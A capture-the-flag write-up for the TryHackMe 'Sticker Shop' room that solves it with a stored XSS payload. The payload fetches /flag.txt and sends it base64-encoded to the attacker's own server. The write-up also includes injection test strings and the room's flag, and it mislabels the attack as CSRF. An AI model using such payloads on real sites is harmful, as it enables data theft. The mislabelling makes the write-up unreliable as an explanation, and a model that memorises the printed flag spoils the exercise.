---
title: "[CTF] Tryhackme - The Sticker Shop "
date: 2024-12-27 12:00:00 -500 
categories: [CTF - Tryhackme, The Sticker Shop]
tags: [ctf,exploit,flags,tryhackme,pentesting,xss]
author: Christoph K
---
[TryHackMe- Sticker Shop ](https://tryhackme.com/r/room/thestickershop)

## Task & Intro

    Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

    Can you read the flag at http://MACHINE_IP:8080/flag.txt?

- What is the content of flag.txt?


### Get the content of flag.txt


First we start over with another scan via `nmap`. I use the paramters `-sV` for checking the `versions` of the services.


```bash
 └─$ nmap $ip -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 18:56 CET
Nmap scan report for 10.10.146.150
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.8.10
|     Date: Sun, 29 Dec 2024 17:56:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1655
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Cat Sticker Shop</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     header {
|     background-color: #333;
|     color: #fff;
|     text-align: center;
|     padding: 10px;
|     header ul {
|     list-style: none;
|     padding: 0;
|     header li {
|     display: inline;
|     margin-right: 20px;
|     header a {
|     text-decoration: none;
|     color: #fff;
|     font-weight: bold;
|     .content {
|     padding: 20px;
|_    .product {
|_http-title: Cat Sticker Shop
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=12/29%Time=67718D5F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,726,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1
SF:\x20Python/3\.8\.10\r\nDate:\x20Sun,\x2029\x20Dec\x202024\x2017:56:48\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x201655\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<h
SF:ead>\n\x20\x20\x20\x20<title>Cat\x20Sticker\x20Shop</title>\n\x20\x20\x
SF:20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif
SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20u
SF:l\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20
SF:none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20head
SF:er\x20li\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:
SF:\x20inline;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-rig
SF:ht:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20header\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20text-decoration:\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\.content\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\.product\x20{\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20bo");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Okay we have `ssh`(Port 22) and a `Python Web Server` on port `8080`. Lets check the website a bit more.


The page is very plain, not much to explore, but there is a subpage `submit_feedback` where we can put text in it:



!["Screenshot Feedback"](assets/img/tryhackme/stickershop/01.png )



I tried a lot of things here like `SQL Injection` ( `feedback=' OR '1'='1`) or `Command Injection` (`feedback=; ls -la`) but it didnt work. 

So we can try to use `XSS` in this feedback form. I assumed that I could use `CSRF` for sending answers like "ls -la" or `cat flag.txt` to me somehow

- `CSRF` stands for `Cross-Site Request Forgery` which means, that we can send feedback to an external source



#### Solution via CSRF

We can use `CSRF` to send the answer from this `feedback form` to us.

I used a simple `http` server via python and a simple script in `js`.

`sudo python3 -m http.server 80`


and we just write a simple (`thanks chatgpt lol`) script for sending the `answer` to our `http server` encrypted in `base64`.


```javascript

<script>
fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.10.74.22:80/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
``` 

Short summary what the script does line by line:

`fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})`

- `fetch` gets the `root page` `/`
- `get`uses `GET`method to read the data
- `credentials: 'same-origin'` uses the same session cookies / information

Target: Should read the whole `html content`from the page.



`.then(response => response.text())`

- `respone.tex()` transforms the answer in readable text

`.then(text => { 
  fetch('http://10.10.74.22:80/' + btoa(text), {mode:'no-cors'}); 
});`

- `btao` codes the content into `base64` for transferting it
- we used our `http server` as target 


We get following anser: 

```bash
10.10.146.150 - - [29/Dec/2024 19:31:21] "GET /PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5DYXQgU3RpY2tlciBTaG9wPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOwogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgfQogICAgICAgIGhlYWRlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMzMzM7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7CiAgICAgICAgfQogICAgICAgIGhlYWRlciB1bCB7CiAgICAgICAgICAgIGxpc3Qtc3R5bGU6IG5vbmU7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgfQogICAgICAgIGhlYWRlciBsaSB7CiAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZTsKICAgICAgICAgICAgbWFyZ2luLXJpZ2h0OiAyMHB4OwogICAgICAgIH0KICAgICAgICBoZWFkZXIgYSB7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIH0KICAgICAgICAuY29udGVudCB7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7CiAgICAgICAgfQogICAgICAgIC5wcm9kdWN0IHsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsKICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgbWFyZ2luOiAxMHB4OwogICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoZWFkZXI+CiAgICAgICAgPHVsPgogICAgICAgICAgICA8bGk+PGEgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICA8bGk+PGEgaHJlZj0iL3N1Ym1pdF9mZWVkYmFjayI+RmVlZGJhY2s8L2E+PC9saT4KICAgICAgICA8L3VsPgogICAgPC9oZWFkZXI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KICAgICAgICA8aDE+V2VsY29tZSB0byB0aGUgQ2F0IFN0aWNrZXIgU2hvcCE8L2gxPgogICAgICAgIDxkaXYgY2xhc3M9InByb2R1Y3QiPgogICAgICAgICAgICA8aW1nIHNyYz0iL3N0YXRpYy9pbWFnZXMvY2F0X3N0aWNrZXJfMS5wbmciIGFsdD0iQ2F0IFN0aWNrZXIgMSIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiPgogICAgICAgICAgICA8aDI+Q2F0IFN0aWNrZXIgMTwvaDI+CiAgICAgICAgICAgIDxwPlByaWNlOiAkMi45OTwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJwcm9kdWN0Ij4KICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1hZ2VzL2NhdF9zdGlja2VyXzIucG5nIiBhbHQ9IkNhdCBTdGlja2VyIDIiIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj4KICAgICAgICAgICAgPGgyPkNhdCBTdGlja2VyIDI8L2gyPgogICAgICAgICAgICA8cD5QcmljZTogJDMuOTk8L3A+CiAgICAgICAgPC9kaXY+CgogICAgPC9kaXY+CiAgICA8YnI+Jm5ic3A7Jm5ic3A7V2Ugb25seSBzZWxsIHN0aWNrZXJzIGF0IG91ciBwaHlzaWNhbCBzdG9yZS4gUGxlYXNlIGZlZWwgZnJlZSB0byBzdG9wIGJ5IQo8L2JvZHk+CjwvaHRtbD4= HTTP/1.1" 404
```

This is the webpage encoded in `base64` which means, that `CSRF` was successful. Lets get the flag by adjusting the script a bit. 

```javascript

<script>
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.6.74.42:1443/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
```


As you can see, we try to `fetch` the `/flag.txt`. We get now following as answer:

```bash
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.146.150 - - [29/Dec/2024 19:34:17] code 404, message File not found
10.10.146.150 - - [29/Dec/2024 19:34:17] "GET /:1443/VEhNezgzNzg5YTY5MDc0ZjYzNmY2NGEzODg3OWNmY2FiZThiNjIzMDVlZTZ9 HTTP/1.1" 404 -

```

We can use cyberchef to decode the `base64` string:

![Cyberchef](assets/img/tryhackme/stickershop/01.png)

And we found our flag!! :-) 


Answer: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`



## Thoughts

This room is very nice to get an understanding how `XSS`, especially `CSRF` works. In this challenge, I leveraged `CSRF` and `XSS`  techniques to exfiltrate sensitive data from the target web server. It was an excellent exercise in understanding web vulnerabilities and their potential impact. Always remember to sanitize user input and validate requests to mitigate these risks.

What did we learn today? 
- Exploting `CSRF`
- some Syntax in `Javascript`


